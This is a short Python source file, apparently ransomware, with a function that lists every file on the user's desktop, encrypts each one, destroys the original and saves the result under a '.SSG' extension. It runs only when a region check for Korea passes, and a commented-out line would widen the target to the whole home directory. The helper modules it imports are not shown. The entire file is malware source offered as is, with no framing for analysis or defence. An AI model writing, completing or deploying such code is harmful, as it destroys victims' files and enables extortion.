import utils
import crypto

def ransomware():
    # files = utils.find_files(utils.get_home_path())
    files = utils.find_files(utils.get_desktop_path())

    for file in files:
        try:
            with open(file, 'rb') as f:
                contents = f.read()
        except:
            continue

        encrypted = crypto.encrypt(contents)
        utils.destroy_file(file)

        new_filename = file + '.SSG'
        
        with open(new_filename, 'wb') as f:
            f.write(encrypted.encode('utf-8'))

if __name__ == "__main__":
    if not utils.is_korea:
        exit()
    ransomware()